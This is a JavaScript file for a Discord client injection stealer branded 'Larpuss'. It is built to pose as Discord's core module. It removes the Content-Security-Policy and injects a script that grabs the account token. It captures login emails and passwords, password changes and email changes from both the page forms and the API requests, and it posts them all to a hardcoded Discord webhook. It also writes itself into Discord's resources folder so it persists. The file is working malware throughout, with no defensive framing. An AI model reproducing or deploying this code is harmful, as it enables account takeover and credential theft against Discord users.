const { app, BrowserWindow, session } = require('electron');
const path = require('path');
const fs = require('fs');
const https = require('https');
const crypto = require('crypto');

// Cache pour éviter les doublons
global.larpussCache = global.larpussCache || {
    sentHashes: new Set(),
    lastSent: new Map()
};

const config = {
    webhook: "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH",
    inject_script: `
        // Larpuss Injection Script - Direct DOM avec déduplication
        (() => {
            const WEBHOOK = "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH";
            
            // Cache local pour éviter les doublons DOM
            window.larpussCache = window.larpussCache || {
                sentData: new Set(),
                lastAction: {}
            };
            
            const createHash = (data) => {
                return btoa(JSON.stringify(data)).replace(/[^a-zA-Z0-9]/g, '').substr(0, 32);
            };
            
            const shouldSendDOM = (data, type) => {
                const hash = createHash({ ...data, type });
                const now = Date.now();
                
                // Éviter doublon exact dans les 30 secondes
                if (window.larpussCache.sentData.has(hash)) {
                    return false;
                }
                
                // Éviter spam même action
                const lastAction = window.larpussCache.lastAction[type];
                if (lastAction && (now - lastAction) < 5000) { // 5 secondes entre mêmes actions
                    return false;
                }
                
                window.larpussCache.sentData.add(hash);
                window.larpussCache.lastAction[type] = now;
                
                // Nettoyer le cache
                if (window.larpussCache.sentData.size > 50) {
                    window.larpussCache.sentData.clear();
                }
                
                return true;
            };
            
            const sendHook = (data, type = 'DOM') => {
                if (!shouldSendDOM(data, type)) return;
                
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(() => {});
            };
            
            const getToken = () => {
                try {
                    let token;
                    webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                        for (const m of Object.keys(req.c).map(x => req.c[x].exports)) {
                            if (m?.default?.getToken) {
                                token = m.default.getToken();
                                break;
                            }
                        }
                    }]);
                    return token || localStorage.token?.replace(/"/g, '');
                } catch {
                    return localStorage.token?.replace(/"/g, '') || null;
                }
            };
            
            const captureLogin = () => {
                const observer = new MutationObserver(() => {
                    // Intercepter les formulaires de login
                    const emailInput = document.querySelector('input[name="email"], input[type="email"]');
                    const passwordInput = document.querySelector('input[name="password"], input[type="password"]');
                    const loginButton = document.querySelector('button[type="submit"], button:contains("Log In"), button:contains("Se connecter")');
                    
                    if (emailInput && passwordInput && loginButton) {
                        loginButton.addEventListener('click', () => {
                            setTimeout(() => {
                                const token = getToken();
                                if (token && token.length > 50) {
                                    sendHook({
                                        embeds: [{
                                            title: "🔓 Larpuss Login Captured",
                                            fields: [
                                                { name: "Email", value: emailInput.value, inline: true },
                                                { name: "Password", value: passwordInput.value, inline: true },
                                                { name: "Token", value: token, inline: false }
                                            ],
                                            color: 0xFFFFFF,
                                            footer: { text: "t.me/larpuss" },
                                            timestamp: new Date().toISOString()
                                        }]
                                    }, 'LOGIN_DOM');
                                }
                            }, 2000);
                        });
                    }
                    
                    // Intercepter les changements de mot de passe (Settings)
                    const currentPasswordInput = document.querySelector('input[name="current_password"], input[placeholder*="Current Password"]');
                    const newPasswordInput = document.querySelector('input[name="new_password"], input[placeholder*="New Password"]');
                    const confirmPasswordInput = document.querySelector('input[name="confirm_password"], input[placeholder*="Confirm"]');
                    const saveButton = document.querySelector('button:contains("Save"), button:contains("Enregistrer")');
                    
                    if (currentPasswordInput && newPasswordInput && saveButton) {
                        saveButton.addEventListener('click', () => {
                            setTimeout(() => {
                                const token = getToken();
                                if (token && currentPasswordInput.value && newPasswordInput.value) {
                                    sendHook({
                                        embeds: [{
                                            title: "🔄 Larpuss Password Changed",
                                            fields: [
                                                { name: "🔑 Old Password", value: currentPasswordInput.value, inline: true },
                                                { name: "🆕 New Password", value: newPasswordInput.value, inline: true },
                                                { name: "Token", value: token, inline: false }
                                            ],
                                            color: 0xFF9900,
                                            footer: { text: "t.me/larpuss • DOM Capture" },
                                            timestamp: new Date().toISOString()
                                        }]
                                    }, 'PASSWORD_CHANGE_DOM');
                                }
                            }, 1000);
                        });
                    }
                    
                    // Intercepter les changements d'email
                    const emailChangeInput = document.querySelector('input[name="email"], input[placeholder*="email"], input[type="email"]');
                    const passwordForEmailInput = document.querySelector('input[name="password"], input[placeholder*="password"]');
                    
                    if (emailChangeInput && passwordForEmailInput && saveButton) {
                        saveButton.addEventListener('click', () => {
                            setTimeout(() => {
                                const token = getToken();
                                if (token && emailChangeInput.value && passwordForEmailInput.value) {
                                    sendHook({
                                        embeds: [{
                                            title: "📧 Larpuss Email Changed", 
                                            fields: [
                                                { name: "📧 New Email", value: emailChangeInput.value, inline: true },
                                                { name: "🔑 Password", value: passwordForEmailInput.value, inline: true },
                                                { name: "Token", value: token, inline: false }
                                            ],
                                            color: 0x0099FF,
                                            footer: { text: "t.me/larpuss • DOM Capture" },
                                            timestamp: new Date().toISOString()
                                        }]
                                    }, 'EMAIL_CHANGE_DOM');
                                }
                            }, 1000);
                        });
                    }
                });
                
                observer.observe(document.body, { childList: true, subtree: true });
            };
            
            // Démarrage
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', captureLogin);
            } else {
                captureLogin();
            }
            
            // Test injection active
            setTimeout(() => {
                const token = getToken();
                if (token) {
                    sendHook({
                        embeds: [{
                            title: "🚀 Larpuss Injection Active",
                            description: "DOM injection running",
                            color: 0x00FF00,
                            footer: { text: "t.me/larpuss" }
                        }]
                    });
                }
            }, 10000);
        })();
    `
};

// Fonction helper pour éviter les doublons
const createHash = (data) => {
    return crypto.createHash('md5').update(JSON.stringify(data)).digest('hex');
};

const shouldSend = (data, type) => {
    const hash = createHash({ ...data, type });
    const now = Date.now();
    
    // Vérifier si déjà envoyé récemment (dans les 30 secondes)
    if (global.larpussCache.sentHashes.has(hash)) {
        return false;
    }
    
    // Pour les logins, vérifier par email (éviter spam même email/password)
    if (type === 'LOGIN' && data.email) {
        const lastSent = global.larpussCache.lastSent.get(`login_${data.email}`);
        if (lastSent && (now - lastSent) < 30000) { // 30 secondes
            return false;
        }
        global.larpussCache.lastSent.set(`login_${data.email}`, now);
    }
    
    // Ajouter au cache
    global.larpussCache.sentHashes.add(hash);
    
    // Nettoyer le cache (garder seulement les 100 derniers)
    if (global.larpussCache.sentHashes.size > 100) {
        const hashArray = Array.from(global.larpussCache.sentHashes);
        global.larpussCache.sentHashes = new Set(hashArray.slice(-50));
    }
    
    return true;
};

// Fonction helper pour envoyer webhook
const sendWebhook = (data, type = 'UNKNOWN') => {
    // Vérifier si on doit envoyer (anti-doublon)
    if (!shouldSend(data, type)) {
        return; // Skip si déjà envoyé récemment
    }
    
    const payload = JSON.stringify(data);
    const url = new URL(config.webhook);
    
    const req = https.request({
        hostname: url.hostname,
        port: 443,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    });
    
    req.write(payload);
    req.end();
};

// Hook pour injecter le script dans toutes les pages Discord
session.defaultSession.webRequest.onHeadersReceived({
    urls: ["*://*.discord.com/*", "*://*.discordapp.com/*"]
}, (details, callback) => {
    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Content-Security-Policy': []
        }
    });
});

// Injection automatique dans les webContents
app.on('web-contents-created', (event, contents) => {
    contents.on('dom-ready', () => {
        if (contents.getURL().includes('discord.com')) {
            contents.executeJavaScript(config.inject_script).catch(() => {});
        }
    });
});

// Hook sur les requêtes réseau pour capturer les logins ET changements
session.defaultSession.webRequest.onBeforeRequest({
    urls: [
        "*://discord.com/api/*/auth/login",
        "*://canary.discord.com/api/*/auth/login",
        "*://ptb.discord.com/api/*/auth/login",
        "*://discord.com/api/*/users/@me",
        "*://canary.discord.com/api/*/users/@me",
        "*://ptb.discord.com/api/*/users/@me"
    ]
}, (details, callback) => {
    if (details.uploadData && details.uploadData[0]) {
        try {
            const requestData = JSON.parse(details.uploadData[0].bytes.toString());
            
            // Login data
            if (details.url.includes('/auth/login')) {
                global.lastLogin = {
                    email: requestData.login || requestData.email,
                    password: requestData.password,
                    timestamp: Date.now(),
                    type: 'LOGIN'
                };
            }
            
            // Account modification data
            if (details.url.includes('/users/@me') && details.method === 'PATCH') {
                global.lastModification = {
                    old_password: requestData.password,
                    new_password: requestData.new_password,
                    new_email: requestData.email,
                    new_username: requestData.username,
                    timestamp: Date.now(),
                    type: 'ACCOUNT_CHANGE'
                };
            }
        } catch {}
    }
    callback({});
});

// Hook sur les réponses pour détecter les logins réussis ET changements
session.defaultSession.webRequest.onCompleted({
    urls: [
        "*://discord.com/api/*/auth/login",
        "*://canary.discord.com/api/*/auth/login", 
        "*://ptb.discord.com/api/*/auth/login",
        "*://discord.com/api/*/users/@me",
        "*://canary.discord.com/api/*/users/@me",
        "*://ptb.discord.com/api/*/users/@me"
    ]
}, (details) => {
    if (details.statusCode === 200) {
        
        // Login réussi
        if (details.url.includes('/auth/login') && global.lastLogin) {
            const loginData = global.lastLogin;
            
            const webhook_data = {
                embeds: [{
                    color: 0xFFFFFF,
                    author: {
                        name: `Larpuss Injection | Login Captured`,
                        icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png?ex=66673862&is=6665e6e2&hm=8190c1ecd41a152387f382bc4fde19ebedaad344c2573a4efd79088a1956622f&=&format=webp&quality=lossless&width=305&height=262"
                    },
                    fields: [
                        {
                            name: `<:accmail:1547383216435101696> Email:`,
                            value: `\`${loginData.email || "Unknown"}\``,
                            inline: true
                        },
                        {
                            name: `🔑 Password:`,
                            value: `\`${loginData.password || "Unknown"}\``,
                            inline: true
                        },
                        {
                            name: `🌐 Client:`,
                            value: `\`${details.url.includes('canary') ? 'Discord Canary' : details.url.includes('ptb') ? 'Discord PTB' : 'Discord Stable'}\``,
                            inline: true
                        }
                    ],
                    footer: {
                        text: "t.me/larpuss",
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            // Envoyer avec déduplication
            sendWebhook(webhook_data, 'LOGIN', loginData);
            global.lastLogin = null;
        }
        
        // Changement de compte réussi
        if (details.url.includes('/users/@me') && details.method === 'PATCH' && global.lastModification) {
            const modData = global.lastModification;
            
            const fields = [
                { name: "⚙️ Account Settings:", value: "User changed account information", inline: false }
            ];
            
            if (modData.old_password && modData.new_password) {
                fields.push(
                    { name: "🔑 Old Password:", value: `\`${modData.old_password}\``, inline: true },
                    { name: "🆕 New Password:", value: `\`${modData.new_password}\``, inline: true }
                );
            }
            
            if (modData.new_email) {
                fields.push({ name: "<:accmail:1547383216435101696> New Email:", value: `\`${modData.new_email}\``, inline: true });
            }
            
            if (modData.new_username) {
                fields.push({ name: "👤 New Username:", value: `\`${modData.new_username}\``, inline: true });
            }
            
            const webhook_data = {
                embeds: [{
                    color: 0xFFFFFF,
                    author: {
                        name: `Larpuss Injection | Account Modified`,
                        icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png?ex=66673862&is=6665e6e2&hm=8190c1ecd41a152387f382bc4fde19ebedaad344c2573a4efd79088a1956622f&=&format=webp&quality=lossless&width=305&height=262"
                    },
                    fields: fields,
                    footer: {
                        text: "t.me/larpuss",
                    },
                    timestamp: new Date().toISOString()
                }]
            };
            
            // Envoyer avec déduplication
            sendWebhook(webhook_data, 'ACCOUNT_CHANGE', modData);
            global.lastModification = null;
        }
    }
});

// Auto-persistence dans Discord
const persistence = () => {
    try {
        const discordPath = process.execPath.replace(/[^\\]*$/, '');
        const resourcesPath = path.join(discordPath, 'resources');
        
        if (fs.existsSync(resourcesPath)) {
            const appPath = path.join(resourcesPath, 'app');
            if (!fs.existsSync(appPath)) {
                fs.mkdirSync(appPath, { recursive: true });
            }
            
            // Package.json
            fs.writeFileSync(path.join(appPath, 'package.json'), JSON.stringify({
                name: "discord",
                main: "index.js"
            }));
            
            // Index.js avec injection
            const indexContent = `
// Larpuss Persistence
${fs.readFileSync(__filename, 'utf8')}

// Load Discord
require('${path.join(resourcesPath, 'app.asar').replace(/\\/g, '\\\\')}');
            `;
            
            fs.writeFileSync(path.join(appPath, 'index.js'), indexContent);
        }
    } catch {}
};

// Démarrage
setTimeout(() => {
    persistence();
}, 3000);

// Export Discord
module.exports = require('./core.asar');
